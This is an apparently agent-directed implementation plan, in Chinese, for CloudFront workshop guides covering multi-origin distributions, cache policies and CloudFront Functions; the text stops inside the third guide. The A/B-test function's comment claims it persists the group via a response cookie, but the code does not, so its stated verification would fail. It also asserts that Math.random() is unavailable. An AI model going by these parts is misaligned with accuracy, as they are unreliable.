# CloudFront 全功能演示平台 - 实施计划 Part 4A

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 编写前 4 篇 Hands-on 实操文档（01-04），覆盖 CloudFront Distribution 创建、缓存策略、CloudFront Functions、WAF 基础防护。每篇包含完整的 AWS Console 操作步骤、配置参数、验证命令，可直接作为客户 Workshop 教材使用。

**Architecture:** 文档基于已部署的演示平台：CloudFront → VPC Origin → Internal ALB → EC2 Express，S3 (OAC) 双源架构。

**Tech Stack:** AWS CloudFront, S3, ALB, VPC Origin, Cache Policy, Origin Request Policy, CloudFront Functions, AWS WAF

**Base Directory:** `/root/keith-space/2026-project/longqi-cloudfront/`

**域名:** `unice.keithyu.cloud` | **区域:** `ap-northeast-1` (东京)

---

## 文件结构总览 (Part 4A)

```
docs/
└── hands-on/
    ├── 01-cloudfront-distribution-multi-origin.md    # Distribution + 双源 + 多 Behavior
    ├── 02-cloudfront-cache-policies.md               # Cache Key + 自定义缓存策略
    ├── 03-cloudfront-functions.md                    # URL 重写 / A-B 测试 / 地理重定向
    └── 04-cloudfront-waf-basic.md                    # WAF Web ACL + 托管规则 + 速率限制
```

---

## Task 16: 基础功能文档 (01-04)

编写 4 篇 Hands-on 文档，每篇提供完整可交付内容。文档面向具备基础 AWS 经验的技术人员，采用 step checkbox 格式，包含 Console 操作路径、配置参数、验证 curl 命令。

---

### Step 16.1: 创建 `docs/hands-on/01-cloudfront-distribution-multi-origin.md`

- [ ] 创建文件 `docs/hands-on/01-cloudfront-distribution-multi-origin.md`

```markdown
# 01 - 创建 CloudFront Distribution：多源路由架构

> **目标**: 创建一个 CloudFront Distribution，配置 S3 (OAC) 和 ALB (VPC Origin) 双源，通过多条 Cache Behavior 实现按路径路由。
>
> **预计时间**: 30-40 分钟
>
> **前提条件**:
> - 已有 S3 桶（存放静态资源）：`unice-static-keithyu-tokyo`
> - 已有 Internal ALB（后端 Express 应用）
> - 已有 ACM 证书（us-east-1，覆盖 `*.keithyu.cloud`）
> - 已有 Route53 托管区域 `keithyu.cloud`

---

## 架构概览

```
用户请求 → CloudFront (unice.keithyu.cloud)
              ├── /static/*    → S3 Origin (OAC)     [静态资源: CSS/JS/字体]
              ├── /images/*    → S3 Origin (OAC)     [商品图片]
              ├── /api/*       → ALB Origin (VPC)    [动态 API]
              └── Default (*)  → ALB Origin (VPC)    [SSR 页面]
```

---

## 步骤 1: 创建 Origin Access Control (OAC)

OAC 用于授权 CloudFront 访问私有 S3 桶，替代已废弃的 OAI。

- [ ] 打开 **CloudFront Console** → 左侧菜单 **Security** → **Origin access**
- [ ] 点击 **Create control setting**
- [ ] 填写配置：

| 参数 | 值 |
|------|-----|
| Name | `unice-s3-oac` |
| Description | `OAC for unice static S3 bucket` |
| Signing behavior | **Sign requests (recommended)** |
| Origin type | **S3** |

- [ ] 点击 **Create**

> **说明**: OAC 会让 CloudFront 对每个发往 S3 的请求进行 SigV4 签名。S3 桶策略通过验证签名来确认请求确实来自指定的 CloudFront Distribution。

---

## 步骤 2: 创建 CloudFront Distribution

- [ ] 打开 **CloudFront Console** → 点击 **Create distribution**

### 2.1 配置 S3 Origin（默认 Origin）

| 参数 | 值 |
|------|-----|
| Origin domain | `unice-static-keithyu-tokyo.s3.ap-northeast-1.amazonaws.com`（从下拉列表选择） |
| Origin name | `S3-unice-static` |
| Origin access | **Origin access control settings (recommended)** |
| Origin access control | 选择 `unice-s3-oac` |
| Enable Origin Shield | No |

- [ ] 配置完成后，CloudFront 会提示需要更新 S3 Bucket Policy —— **先记下提示的策略内容，稍后配置**

### 2.2 配置 Default Cache Behavior

| 参数 | 值 |
|------|-----|
| Path pattern | `Default (*)` |
| Compress objects automatically | **Yes** |
| Viewer protocol policy | **Redirect HTTP to HTTPS** |
| Allowed HTTP methods | **GET, HEAD, OPTIONS, PUT, POST, PATCH, DELETE** |
| Cache key and origin requests | **Cache policy and origin request policy (recommended)** |
| Cache policy | `CachingDisabled`（临时设置，后续步骤更改） |
| Origin request policy | `AllViewer` |
| Response headers policy | 无 |

### 2.3 配置 Settings

| 参数 | 值 |
|------|-----|
| Price class | **Use North America, Europe, Asia, Middle East, and Africa** (PriceClass_200) |
| AWS WAF web ACL | 暂不关联（文档 04 配置） |
| Alternate domain name (CNAME) | `unice.keithyu.cloud` |
| Custom SSL certificate | 选择 `*.keithyu.cloud`（us-east-1 证书） |
| Security policy | **TLSv1.2_2021 (recommended)** |
| Supported HTTP versions | **HTTP/2** |
| Default root object | `index.html` |
| Standard logging | Off（可后续开启） |
| IPv6 | On |

- [ ] 点击 **Create distribution**
- [ ] **记录 Distribution ID**（如 `E1XXXXXXXXXX`）和 **Distribution Domain**（如 `dxxxxxxxxxx.cloudfront.net`）

---

## 步骤 3: 更新 S3 Bucket Policy

- [ ] 打开 **S3 Console** → 选择桶 `unice-static-keithyu-tokyo` → **Permissions** 标签 → **Bucket policy** → **Edit**
- [ ] 粘贴以下策略（将 `DISTRIBUTION_ARN` 替换为实际值）：

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowCloudFrontOAC",
            "Effect": "Allow",
            "Principal": {
                "Service": "cloudfront.amazonaws.com"
            },
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::unice-static-keithyu-tokyo/*",
            "Condition": {
                "StringEquals": {
                    "AWS:SourceArn": "arn:aws:cloudfront::434465421667:distribution/DISTRIBUTION_ID"
                }
            }
        }
    ]
}
```

- [ ] 点击 **Save changes**

---

## 步骤 4: 添加 ALB Origin (VPC Origin)

VPC Origin 让 CloudFront 通过 AWS 内部网络直接连接 Internal ALB，无需 ALB 暴露公网。

- [ ] 打开 **CloudFront Console** → 选择刚创建的 Distribution → **Origins** 标签 → **Create origin**

| 参数 | 值 |
|------|-----|
| Origin domain | 选择 Internal ALB 的 DNS 名称（如 `internal-unice-demo-alb-xxxxxxxxx.ap-northeast-1.elb.amazonaws.com`） |
| Origin name | `ALB-unice-internal` |
| Protocol | **HTTP only** |
| HTTP port | `80` |
| Enable Origin Shield | No |

> **VPC Origin 配置**：当选择 Internal ALB 作为 Origin 时，CloudFront 会自动检测到这是一个内网资源，并提示启用 VPC Origin。

- [ ] 在 VPC Origin 配置部分：

| 参数 | 值 |
|------|-----|
| VPC Origin | **Create new VPC origin** |
| VPC | 选择现有 VPC |
| Security group | 选择 `unice-demo-vpc-origin-sg` |

- [ ] 点击 **Create origin**
- [ ] 等待 VPC Origin 状态变为 **Deployed**（约 3-5 分钟）

---

## 步骤 5: 配置多条 Cache Behavior

创建 4 条 Behavior，按路径将请求路由到不同 Origin。

### 5.1 创建 `/static/*` Behavior

- [ ] **Behaviors** 标签 → **Create behavior**

| 参数 | 值 |
|------|-----|
| Path pattern | `/static/*` |
| Origin and origin groups | `S3-unice-static` |
| Compress objects automatically | **Yes** |
| Viewer protocol policy | **Redirect HTTP to HTTPS** |
| Allowed HTTP methods | **GET, HEAD** |
| Cache policy | `CachingOptimized`（AWS 托管，TTL 86400s） |
| Origin request policy | 无 |

- [ ] 点击 **Create behavior**

### 5.2 创建 `/images/*` Behavior

- [ ] **Behaviors** 标签 → **Create behavior**

| 参数 | 值 |
|------|-----|
| Path pattern | `/images/*` |
| Origin and origin groups | `S3-unice-static` |
| Compress objects automatically | **Yes** |
| Viewer protocol policy | **Redirect HTTP to HTTPS** |
| Allowed HTTP methods | **GET, HEAD** |
| Cache policy | `CachingOptimized` |
| Origin request policy | 无 |

- [ ] 点击 **Create behavior**

### 5.3 创建 `/api/products*` Behavior

- [ ] **Behaviors** 标签 → **Create behavior**

| 参数 | 值 |
|------|-----|
| Path pattern | `/api/products*` |
| Origin and origin groups | `ALB-unice-internal` |
| Compress objects automatically | **Yes** |
| Viewer protocol policy | **Redirect HTTP to HTTPS** |
| Allowed HTTP methods | **GET, HEAD, OPTIONS** |
| Cache policy | 自定义 `ProductCache`（文档 02 创建后回填，暂用 `CachingDisabled`） |
| Origin request policy | `AllViewer` |

- [ ] 点击 **Create behavior**

### 5.4 创建 `/api/*` Behavior（购物车/用户/订单/调试）

- [ ] **Behaviors** 标签 → **Create behavior**

| 参数 | 值 |
|------|-----|
| Path pattern | `/api/*` |
| Origin and origin groups | `ALB-unice-internal` |
| Compress objects automatically | **Yes** |
| Viewer protocol policy | **Redirect HTTP to HTTPS** |
| Allowed HTTP methods | **GET, HEAD, OPTIONS, PUT, POST, PATCH, DELETE** |
| Cache policy | `CachingDisabled`（AWS 托管） |
| Origin request policy | `AllViewer` |

- [ ] 点击 **Create behavior**

> **Behavior 优先级说明**: CloudFront 按从上到下的顺序匹配 Path Pattern。`/api/products*` 放在 `/api/*` 前面，确保商品 API 命中专属缓存策略，其余 API 走 CachingDisabled。Default (`*`) 在最后兜底。

### 5.5 调整 Default (*) Behavior

- [ ] 选择 **Default (*)** → **Edit**
- [ ] 修改 Origin 为 `ALB-unice-internal`
- [ ] Cache policy 暂设为 `CachingDisabled`（文档 02 创建 PageCache 后回填）
- [ ] Origin request policy 设为 `AllViewer`
- [ ] 点击 **Save changes**

---

## 步骤 6: 配置 Route53 DNS 记录

- [ ] 打开 **Route53 Console** → **Hosted zones** → `keithyu.cloud`
- [ ] 点击 **Create record**

| 参数 | 值 |
|------|-----|
| Record name | `unice` |
| Record type | **A** |
| Alias | **Yes** |
| Route traffic to | **Alias to CloudFront distribution** |
| Distribution | 选择刚创建的 Distribution |
| Routing policy | **Simple routing** |

- [ ] 点击 **Create records**

---

## 步骤 7: 验证

等待 Distribution 状态变为 **Deployed**（约 5-10 分钟），然后验证各路径：

### 7.1 验证 S3 Origin（静态资源）

先上传一个测试文件到 S3：

```bash
# 上传测试静态文件
echo '<h1>Hello from S3</h1>' > /tmp/test.html
aws s3 cp /tmp/test.html s3://unice-static-keithyu-tokyo/static/test.html \
  --region ap-northeast-1

# 验证通过 CloudFront 访问 S3 内容
curl -sI https://unice.keithyu.cloud/static/test.html
```

- [ ] 确认返回 `HTTP/2 200`
- [ ] 确认 `x-cache` header 为 `Miss from cloudfront`（首次访问）或 `Hit from cloudfront`（二次访问）

### 7.2 验证 ALB Origin（动态 API）

```bash
# 验证健康检查端点
curl -s https://unice.keithyu.cloud/api/health | jq .

# 验证 debug 端点（查看 CloudFront 注入的 headers）
curl -s https://unice.keithyu.cloud/api/debug | jq .headers
```

- [ ] 确认 `/api/health` 返回 `{"status":"ok",...}`
- [ ] 确认 `/api/debug` 中包含 `x-forwarded-for`、`x-forwarded-proto: https` 等 CloudFront 注入的 header

### 7.3 验证路径路由

```bash
# 测试默认路径（SSR 页面，走 ALB）
curl -sI https://unice.keithyu.cloud/

# 测试图片路径（走 S3）
echo 'test-image' > /tmp/test.jpg
aws s3 cp /tmp/test.jpg s3://unice-static-keithyu-tokyo/images/test.jpg \
  --region ap-northeast-1
curl -sI https://unice.keithyu.cloud/images/test.jpg
```

- [ ] 确认不同路径命中不同 Origin（通过 `x-cache` 和 `server` header 区分）

---

## 常见问题

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| 403 AccessDenied 访问 S3 内容 | S3 Bucket Policy 未配置或 Distribution ARN 错误 | 检查 Bucket Policy 中的 `AWS:SourceArn` 是否匹配 Distribution ARN |
| 502 Bad Gateway 访问 API 路径 | VPC Origin 未就绪或安全组不通 | 确认 VPC Origin 状态为 Deployed；确认 vpc-origin-sg 出站允许 80 到 alb-sg |
| DNS 不解析 | Route53 记录未生效 | `dig unice.keithyu.cloud` 检查解析，CNAME 传播最多需要 60 秒 |
| HTTPS 证书错误 | ACM 证书不在 us-east-1 或未覆盖该域名 | CloudFront 只能使用 us-east-1 的证书，确认证书包含 `*.keithyu.cloud` |
```

---

### Step 16.2: 创建 `docs/hands-on/02-cloudfront-cache-policies.md`

- [ ] 创建文件 `docs/hands-on/02-cloudfront-cache-policies.md`

```markdown
# 02 - CloudFront 缓存策略：Cache Key 与自定义 Policy

> **目标**: 理解 CloudFront Cache Key 的组成，创建自定义 Cache Policy（ProductCache 3600s / PageCache 60s）和 Origin Request Policy，验证缓存命中行为。
>
> **预计时间**: 20-30 分钟
>
> **前提条件**:
> - 已完成文档 01（Distribution 已创建并部署）

---

## 概念说明：Cache Key 的组成

CloudFront 使用 **Cache Key** 来标识缓存中的每个对象。Cache Key 决定了"什么条件下认为两个请求是同一个资源"。

```
Cache Key = URL Path + 选定的 Query Strings + 选定的 Headers + 选定的 Cookies
```

**核心原则**：
- Cache Key 中包含的元素越多 → 缓存粒度越细 → 命中率越低
- Cache Key 中包含的元素越少 → 缓存粒度越粗 → 命中率越高

**Cache Policy vs Origin Request Policy**：
| | Cache Policy | Origin Request Policy |
|---|---|---|
| 作用 | 决定哪些元素组成 Cache Key | 决定哪些元素转发给 Origin |
| 对缓存命中率的影响 | 直接影响 | 不影响 |
| 典型使用 | 控制缓存粒度 | Origin 需要但不应影响缓存的数据 |

> **关键区分**：如果 Origin 需要 `Accept-Language` header 来返回不同语言的内容，但你不想为每种语言单独缓存，就把它放在 Origin Request Policy（转发但不加入 Cache Key）。反之，如果确实需要按语言分别缓存，就放在 Cache Policy。

---

## 步骤 1: 创建自定义 Cache Policy — ProductCache (3600s)

用于 `/api/products*` 路径。商品数据按 Query String 区分（page/category/sort），缓存 1 小时。

- [ ] 打开 **CloudFront Console** → 左侧菜单 **Policies** → **Cache** → **Create cache policy**

| 参数 | 值 |
|------|-----|
| Name | `ProductCache` |
| Description | `Product API cache - 1 hour TTL, cache key includes all query strings` |
| **TTL settings** | |
| Minimum TTL | `60` (秒) |
| Maximum TTL | `3600` (秒) |
| Default TTL | `3600` (秒) |
| **Cache key settings** | |
| Headers | **None** |
| Cookies | **None** |
| Query strings | **All** |
| **Compression support** | |
| Gzip | **Enabled** |
| Brotli | **Enabled** |

- [ ] 点击 **Create**

> **为什么 Query strings 选 All**：商品列表 API 使用 `/api/products?page=1&category=shoes&sort=price` 格式。不同的 page/category/sort 组合应该有独立缓存，所以把所有 Query String 都加入 Cache Key。

---

## 步骤 2: 创建自定义 Cache Policy — PageCache (60s)

用于 Default (*) 路径。SSR 页面短缓存 60 秒，仅转发 `x-trace-id` 和 `aws-waf-token` 两个 Cookie。

- [ ] **Policies** → **Cache** → **Create cache policy**

| 参数 | 值 |
|------|-----|
| Name | `PageCache` |
| Description | `SSR page cache - 60s TTL, include trace and WAF cookies` |
| **TTL settings** | |
| Minimum TTL | `0` (秒) |
| Maximum TTL | `60` (秒) |
| Default TTL | `60` (秒) |
| **Cache key settings** | |
| Headers | **Include the following headers** → 添加 `Accept`, `Accept-Language` |
| Cookies | **Include the following cookies** → 添加 `x-trace-id`, `aws-waf-token` |
| Query strings | **All** |
| **Compression support** | |
| Gzip | **Enabled** |
| Brotli | **Enabled** |

- [ ] 点击 **Create**

> **为什么只转发 2 个 Cookie**：浏览器可能携带大量 Cookie（analytics、session 等）。如果全部加入 Cache Key，几乎每个用户的请求都会成为唯一的缓存条目，命中率接近 0%。仅包含业务必需的 `x-trace-id`（用户追踪）和 `aws-waf-token`（WAF 验证）。

---

## 步骤 3: 创建 Origin Request Policy（可选）

如果 Origin 需要额外的 Header/Cookie 但这些不应影响缓存，就需要自定义 Origin Request Policy。

对于本平台，大部分场景使用 AWS 托管的 `AllViewer` 策略即可（转发所有 Viewer 的 Header/Cookie/Query String）。

查看已有托管策略：

- [ ] 打开 **CloudFront Console** → **Policies** → **Origin request**
- [ ] 确认以下托管策略可用：

| 策略名称 | 转发内容 | 使用场景 |
|----------|----------|----------|
| `AllViewer` | 所有 Header + Cookie + Query String | API 路由需要完整请求信息 |
| `CORS-S3Origin` | CORS 相关 Header | S3 跨域资源 |
| `UserAgentRefererHeaders` | User-Agent + Referer | 简单日志/统计场景 |

> **本平台策略**：`/api/*` Behavior 使用 `AllViewer`（API 需要完整信息），S3 Behavior 不设 Origin Request Policy（静态资源不需要额外 header）。

---

## 步骤 4: 将自定义 Cache Policy 绑定到 Behavior

### 4.1 绑定 ProductCache 到 `/api/products*`

- [ ] 打开 Distribution → **Behaviors** → 选择 `/api/products*` → **Edit**
- [ ] 修改 Cache policy 为 `ProductCache`
- [ ] Origin request policy 保持 `AllViewer`
- [ ] 点击 **Save changes**

### 4.2 绑定 PageCache 到 Default (*)

- [ ] 选择 **Default (*)** → **Edit**
- [ ] 修改 Cache policy 为 `PageCache`
- [ ] Origin request policy 保持 `AllViewer`
- [ ] 点击 **Save changes**

- [ ] 等待 Distribution 状态变为 **Deployed**

---

## 步骤 5: 验证缓存行为

### 5.1 验证 ProductCache（商品 API）

```bash
# 第一次请求 - 应该是 Miss
curl -sI https://unice.keithyu.cloud/api/products?page=1&category=all | grep -i x-cache

# 第二次请求 - 应该是 Hit
curl -sI https://unice.keithyu.cloud/api/products?page=1&category=all | grep -i x-cache

# 不同 Query String - 应该是 Miss（不同的 Cache Key）
curl -sI https://unice.keithyu.cloud/api/products?page=2&category=all | grep -i x-cache
```

- [ ] 确认第一次请求 `X-Cache: Miss from cloudfront`
- [ ] 确认第二次请求 `X-Cache: Hit from cloudfront`
- [ ] 确认不同 Query String 产生 `Miss`（说明 Query String 确实加入了 Cache Key）

### 5.2 验证 PageCache（SSR 页面）

```bash
# 第一次请求
curl -sI https://unice.keithyu.cloud/ | grep -i x-cache

# 第二次请求（60 秒内）
curl -sI https://unice.keithyu.cloud/ | grep -i x-cache

# 等待 60 秒后请求 - 缓存已过期
sleep 65
curl -sI https://unice.keithyu.cloud/ | grep -i x-cache
```

- [ ] 确认 60 秒内第二次请求为 `Hit`
- [ ] 确认 60 秒后请求为 `Miss`（缓存已过期）

### 5.3 验证 CachingDisabled（购物车/用户 API）

```bash
# 多次请求 - 始终是 Miss（不缓存）
curl -sI https://unice.keithyu.cloud/api/debug | grep -i x-cache
curl -sI https://unice.keithyu.cloud/api/debug | grep -i x-cache
```

- [ ] 确认每次请求都是 `Miss from cloudfront`（CachingDisabled 生效）

### 5.4 查看完整缓存相关 Header

```bash
# 完整 Header 检查
curl -sI https://unice.keithyu.cloud/api/products?page=1 | grep -iE '(x-cache|age|cache-control|x-amz)'
```

- [ ] `X-Cache`: 显示 Hit/Miss 状态
- [ ] `Age`: 对象在缓存中的存活时间（秒），仅 Hit 时出现
- [ ] `X-Amz-Cf-Pop`: 响应的 CloudFront PoP 节点（如 `NRT51-C3` = 东京）

---

## Behavior 与缓存策略对照表

| Path Pattern | Origin | Cache Policy | TTL | Query String | Cookie | 使用场景 |
|---|---|---|---|---|---|---|
| `/static/*` | S3 (OAC) | CachingOptimized | 86400s (24h) | 无 | 无 | CSS/JS/字体 |
| `/images/*` | S3 (OAC) | CachingOptimized | 86400s (24h) | 无 | 无 | 商品图片 |
| `/api/products*` | ALB (VPC) | ProductCache | 3600s (1h) | All | 无 | 商品列表 |
| `/api/*` | ALB (VPC) | CachingDisabled | 0 | All | All | 购物车/用户/订单/调试 |
| `Default (*)` | ALB (VPC) | PageCache | 60s | All | x-trace-id, aws-waf-token | SSR 页面 |

---

## 常见问题

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| 始终是 Miss，永远不 Hit | Cache Policy 的 TTL 设为 0，或 Origin 返回 `Cache-Control: no-store` | 检查 Cache Policy TTL 设置；用 `curl -sI` 查看 Origin 返回的 `Cache-Control` header |
| 不同用户看到相同缓存内容 | Cookie 未加入 Cache Key | 确认需要按用户区分的 Behavior 使用 CachingDisabled |
| Cache Policy 创建后看不到 | Console 页面缓存 | 刷新页面，或直接在 Behavior 编辑页面的下拉菜单中搜索 |
| Query String 变更后仍返回旧内容 | Query String 未加入 Cache Key | 检查 Cache Policy 的 Query strings 设置是否为 All |
```

---

### Step 16.3: 创建 `docs/hands-on/03-cloudfront-functions.md`

- [ ] 创建文件 `docs/hands-on/03-cloudfront-functions.md`

```markdown
# 03 - CloudFront Functions：边缘计算实战

> **目标**: 创建并部署 3 个 CloudFront Functions（URL 重写、A/B 测试分流、地理位置重定向），理解边缘计算的使用场景和限制。
>
> **预计时间**: 30-40 分钟
>
> **前提条件**:
> - 已完成文档 01（Distribution 已创建并部署）

---

## CloudFront Functions 简介

CloudFront Functions 是运行在 CloudFront 边缘节点的轻量级 JavaScript 运行时：

| 特性 | CloudFront Functions | Lambda@Edge |
|------|---------------------|-------------|
| 执行延迟 | < 1ms | 5-50ms |
| 最大代码量 | 10 KB | 50 MB |
| 最大执行时间 | 2ms | 5s (Viewer) / 30s (Origin) |
| 网络访问 | 不支持 | 支持 |
| 触发阶段 | Viewer Request / Viewer Response | 全部 4 个阶段 |
| 费用 | $0.10 / 百万次 | $0.60 / 百万次 |

**适用场景**：URL 重写、Header 操作、Cookie 读写、简单重定向、请求校验。

---

## Function 1: URL 重写 (cf-url-rewrite)

### 功能说明

将用户友好的 URL（如 `/products/123`）重写为应用内部路由（如 `/api/products/123`），使 CloudFront 的 Behavior 路径匹配与前端 URL 解耦。

### 步骤 1.1: 创建 Function

- [ ] 打开 **CloudFront Console** → 左侧菜单 **Functions** → **Create function**

| 参数 | 值 |
|------|-----|
| Name | `cf-url-rewrite` |
| Description | `Rewrite friendly URLs to internal API routes` |
| Runtime | **cloudfront-js-2.0** |

- [ ] 点击 **Create function**

### 步骤 1.2: 编写 Function 代码

- [ ] 在 **Build** 标签页中，替换默认代码为：

```javascript
function handler(event) {
    var request = event.request;
    var uri = request.uri;

    // 路由重写规则
    var rewrites = [
        // /products/123 → /api/products/123
        { pattern: /^\/products\/(.+)$/, target: '/api/products/$1' },
        // /products → /api/products
        { pattern: /^\/products\/?$/, target: '/api/products' },
        // /cart → /api/cart
        { pattern: /^\/cart\/?$/, target: '/api/cart' },
        // /orders → /api/orders
        { pattern: /^\/orders\/?$/, target: '/api/orders' },
    ];

    for (var i = 0; i < rewrites.length; i++) {
        var match = uri.match(rewrites[i].pattern);
        if (match) {
            // 执行替换（支持 $1 捕获组）
            request.uri = rewrites[i].target.replace('$1', match[1] || '');
            break;
        }
    }

    return request;
}
```

- [ ] 点击 **Save changes**

### 步骤 1.3: 测试 Function

- [ ] 切换到 **Test** 标签页
- [ ] 配置测试事件：

| 参数 | 值 |
|------|-----|
| Event type | **Viewer Request** |
| Stage | **Development** |
| URL path | `/products/123` |
| HTTP method | `GET` |

- [ ] 点击 **Test function**
- [ ] 确认输出中 URI 已变为 `/api/products/123`

再测试其他路径：

| 输入 URI | 期望输出 URI |
|----------|-------------|
| `/products/123` | `/api/products/123` |
| `/products` | `/api/products` |
| `/cart` | `/api/cart` |
| `/static/style.css` | `/static/style.css`（不匹配，保持不变） |

### 步骤 1.4: 发布 Function

- [ ] 切换到 **Publish** 标签页 → 点击 **Publish function**

### 步骤 1.5: 关联到 Behavior

- [ ] 在 **Publish** 标签页下方 **Associated distributions** 区域 → **Add association**

| 参数 | 值 |
|------|-----|
| Distribution | 选择 `unice.keithyu.cloud` 对应的 Distribution |
| Event type | **Viewer Request** |
| Cache behavior | **Default (*)** |

- [ ] 点击 **Add association**

---

## Function 2: A/B 测试分流 (cf-ab-test)

### 功能说明

无需修改后端代码即可实现 A/B 测试。通过 Cookie 持久化用户的分组（A 或 B），确保同一用户始终看到同一版本。

### 步骤 2.1: 创建 Function

- [ ] **Functions** → **Create function**

| 参数 | 值 |
|------|-----|
| Name | `cf-ab-test` |
| Description | `A/B test traffic splitting via cookie` |
| Runtime | **cloudfront-js-2.0** |

### 步骤 2.2: 编写 Function 代码

- [ ] 替换默认代码为：

```javascript
function handler(event) {
    var request = event.request;
    var headers = request.headers;
    var cookies = request.cookies;

    // 检查是否已有 A/B 分组 cookie
    var abGroup = '';
    if (cookies['x-ab-group']) {
        abGroup = cookies['x-ab-group'].value;
    }

    // 如果没有分组，随机分配
    if (abGroup !== 'A' && abGroup !== 'B') {
        // 使用简单的伪随机：基于时间戳的最后一位奇偶判断
        // CloudFront Functions 不支持 Math.random()
        var timestamp = Date.now();
        abGroup = (timestamp % 2 === 0) ? 'A' : 'B';

        // 设置 cookie（通过在 request 中添加 cookie header 传给 Origin）
        // 并通过 response cookie 持久化到浏览器
        request.cookies['x-ab-group'] = { value: abGroup };
    }

    // 添加自定义 header 传递给 Origin（后端可据此返回不同内容）
    headers['x-ab-group'] = { value: abGroup };

    return request;
}
```

- [ ] 点击 **Save changes**

### 步骤 2.3: 测试 Function

- [ ] **Test** 标签页，Event type: **Viewer Request**

**测试场景 1 - 无 Cookie（新用户）**：

| 参数 | 值 |
|------|-----|
| URL path | `/` |
| Cookies | （空） |

- [ ] 确认输出包含 `x-ab-group` header，值为 `A` 或 `B`

**测试场景 2 - 有 Cookie（回访用户）**：

| 参数 | 值 |
|------|-----|
| URL path | `/` |
| Cookies | `x-ab-group=A` |

- [ ] 确认输出保持 `x-ab-group: A`（沿用已有分组）

### 步骤 2.4: 发布并关联

- [ ] **Publish** → **Publish function**
- [ ] **Add association**：

| 参数 | 值 |
|------|-----|
| Distribution | 选择 Distribution |
| Event type | **Viewer Request** |
| Cache behavior | **Default (*)** |

- [ ] 点击 **Add association**

> **注意**: 同一 Behavior 的同一 Event type 只能关联一个 Function。如果 URL 重写已关联到 Default (*) 的 Viewer Request，需要将两个 Function 的逻辑合并到一个 Function 中，或将 A/B 测试关联到其他 Behavior。在生产环境中，通常会将多个简单逻辑合并为一个 Function。

---

## Function 3: 地理位置重定向 (cf-geo-redirect)

### 功能说明

利用 CloudFront 自动注入的 `CloudFront-Viewer-Country` header，将中国大陆（CN）用户重定向到 `/cn/` 前缀路径，实现多区域内容分发。

### 步骤 3.1: 创建 Function

- [ ] **Functions** → **Create function**

| 参数 | 值 |
|------|-----|
| Name | `cf-geo-redirect` |
| Description | `Redirect CN visitors to /cn/ prefix path` |
| Runtime | **cloudfront-js-2.0** |

### 步骤 3.2: 编写 Function 代码

- [ ] 替换默认代码为：

```javascript
function handler(event) {
    var request = event.request;
    var headers = request.headers;
    var uri = request.uri;

    // CloudFront 自动注入的地理位置 header
    var country = '';
    if (headers['cloudfront-viewer-country']) {
        country = headers['cloudfront-viewer-country'].value;
    }

    // 重定向规则：CN 用户重定向到 /cn/ 前缀路径
    // 排除条件：已在 /cn/ 路径下、静态资源、API 请求
    if (country === 'CN'
        && !uri.startsWith('/cn/')
        && !uri.startsWith('/static/')
        && !uri.startsWith('/images/')
        && !uri.startsWith('/api/')) {

        var redirectUrl = '/cn' + uri;

        return {
            statusCode: 302,
            statusDescription: 'Found',
            headers: {
                'location': { value: 'https://unice.keithyu.cloud' + redirectUrl },
                'cache-control': { value: 'no-cache, no-store, must-revalidate' }
            }
        };
    }

    return request;
}
```

- [ ] 点击 **Save changes**

### 步骤 3.3: 配置 CloudFront 转发地理位置 Header

CloudFront 默认不转发 `CloudFront-Viewer-Country` header。需要在 Cache Policy 或 Origin Request Policy 中启用。

- [ ] 打开 Distribution → **Behaviors** → 选择需要地理重定向的 Behavior → **Edit**
- [ ] 在 **Cache key and origin requests** 部分，确认 Origin request policy 为 `AllViewer` 或创建自定义策略包含 `CloudFront-Viewer-Country`

> **备选方案**：在 CloudFront Functions 中可直接读取 `cloudfront-viewer-country` header（CloudFront 自动注入），无需额外配置 Origin Request Policy。Function 在 Viewer Request 阶段执行时，CloudFront 已完成地理位置识别。

### 步骤 3.4: 测试 Function

- [ ] **Test** 标签页

**测试场景 1 - 中国用户访问首页**：

| 参数 | 值 |
|------|-----|
| URL path | `/` |
| Headers | `cloudfront-viewer-country: CN` |

- [ ] 确认返回 302 重定向到 `https://unice.keithyu.cloud/cn/`

**测试场景 2 - 日本用户访问首页**：

| 参数 | 值 |
|------|-----|
| URL path | `/` |
| Headers | `cloudfront-viewer-country: JP` |

- [ ] 确认请求正常通过（无重定向）

**测试场景 3 - 中国用户访问 API（不重定向）**：

| 参数 | 值 |
|------|-----|
| URL path | `/api/products` |
| Headers | `cloudfront-viewer-country: CN` |

- [ ] 确认请求正常通过（API 路径排除在外）

### 步骤 3.5: 发布并关联

- [ ] **Publish** → **Publish function**
- [ ] **Add association**（选择合适的 Behavior 和 Event type）

---

## 步骤 4: 综合验证

### 4.1 验证 URL 重写

```bash
# 访问友好 URL（应被重写到 /api/products）
curl -s https://unice.keithyu.cloud/products | jq .

# 访问带参数的友好 URL
curl -s https://unice.keithyu.cloud/products/123 | jq .
```

- [ ] 确认 `/products` 返回商品列表（说明成功重写到 `/api/products`）

### 4.2 验证 A/B 测试

```bash
# 不带 cookie 请求 - 查看分配的分组
curl -sI https://unice.keithyu.cloud/ | grep -i x-ab-group

# 带 cookie 请求 - 应保持分组
curl -sI -b "x-ab-group=A" https://unice.keithyu.cloud/ | grep -i x-ab-group

# 通过 debug 端点查看 Origin 收到的 header
curl -s -b "x-ab-group=B" https://unice.keithyu.cloud/api/debug | jq '.headers["x-ab-group"]'
```

- [ ] 确认不带 cookie 时被分配 A 或 B
- [ ] 确认带 cookie 时保持原有分组
- [ ] 确认 Origin 的 debug 端点能看到 `x-ab-group` header

### 4.3 验证地理重定向

```bash
# 模拟中国用户请求（通过 debug 端点观察，实际重定向需要真实的地理位置）
# 注意：curl 无法直接模拟 CloudFront 注入的地理 header，此验证依赖 Console Test 功能

# 查看 CloudFront 注入的地理位置 header
curl -s https://unice.keithyu.cloud/api/debug | jq '.headers | to_entries[] | select(.key | startswith("cloudfront-viewer"))'
```

- [ ] 确认可以看到 `cloudfront-viewer-country` 等地理位置 header

---

## 常见问题

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| Function 发布失败 | 代码超过 10KB 或语法错误 | 检查代码大小和语法；Functions 不支持 ES6+ 的部分特性（如 let/const 在 JS 1.0 运行时） |
